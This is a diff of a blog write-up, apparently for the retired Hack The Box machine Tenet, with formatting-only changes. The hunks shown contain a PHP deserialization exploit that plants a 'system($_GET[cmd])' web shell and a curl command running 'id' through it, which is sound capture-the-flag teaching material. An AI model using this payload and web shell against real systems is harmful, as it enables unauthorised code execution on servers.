@@ -19,12 +19,13 @@ Hello guys!
 
 This week's machine will be **Tenet**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [egotisticalSW](https://app.hackthebox.eu/users/94858).
 
-\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box machines are posted as soon as they're retired.
+</Alert>
 
 ![HTB Tenet](https://i.imgur.com/vouXrOD.png)
 
-Before starting the resolution of this box, the image above called my attention, where I searched about TENET on the Internet and found about the Sator Square, where we have a palindrome made up of the 5 Latin words: *SATOR*, *AREPO*, *TENET*, *OPERA* e *ROTAS*, forming a square being TENET in the center lines. Is highly probable that these words will appear during its resolution \:smile:.
+Before starting the resolution of this box, the image above called my attention, where I searched about TENET on the Internet and found about the Sator Square, where we have a palindrome made up of the 5 Latin words: _SATOR_, _AREPO_, _TENET_, _OPERA_ e _ROTAS_, forming a square being TENET in the center lines. Is highly probable that these words will appear during its resolution \:smile:.
 
 ## Enumeration
 
@@ -93,8 +94,8 @@ As accessing the webpage again from the URL `http://10.10.10.223/wordpress` erro
 In the WordPress instance available at `http://tenet.htb/wordpress`, noticed some posts where one of them was mentioning an application called **Rotas**, which could contain some item we could abuse to get an initial foothold in this box.
 
 > This Is Where Our Worlds Collide
-> We’re looking for beta testers of our new time-management software, ‘Rotas’
-> ‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.
+> We're looking for beta testers of our new time-management software, 'Rotas'
+> 'Rotas' will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.
 
 Things get more interesting in an older post, where user **neil** comments the content below:
 
@@ -113,13 +114,13 @@ class DatabaseExport
 {
     public $user_file = 'users.txt';
     public $data = '';
-    
+
     public function update_db()
     {
         echo '[+] Grabbing users from text file <br>';
         $this-> data = 'Success';
     }
-    
+
     public function __destruct()
     {
         file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
@@ -144,19 +145,19 @@ As we can see we could exploit it using **PHP Deserialization**, once it doesn't
 The first step to the reverse shell was to create a serialized PHP payload to be sent in a request via **arepo** arg. Searching a little about it I have found [this exploit sample](https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php) which was later modified to store a simple web shell in the box, later used to get a reverse shell.
 
 ```php
-<?php 
+<?php
 
 class DatabaseExport
 {
     public $user_file = 'shell.php';
     public $data = '<?php system($_GET["cmd"]); ?>';
-    
+
     public function update_db()
     {
         echo '[+] Grabbing users from text file <br>';
         $this-> data = 'Success';
     }
-    
+
     public function __destruct()
     {
         file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
@@ -176,7 +177,7 @@ After its execution, I was able to issue the `id` command by using curl as we ca
 ```bash
 $ php exploit.php
 [] Database updated <br>[+] Grabbing users from text file <br>
-[] Database updated <br>[] Database updated <br>   
+[] Database updated <br>[] Database updated <br>
 
 $ curl -L http://10.10.10.223/shell.php?cmd=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -237,7 +238,7 @@ Before trying to crack those hashes, being `protagonist` password reused from `r
 ```plaintext
 Matching Defaults entries for www-data on tenet:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
-    
+
 User www-data may run the following commands on tenet:
     (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
 ```
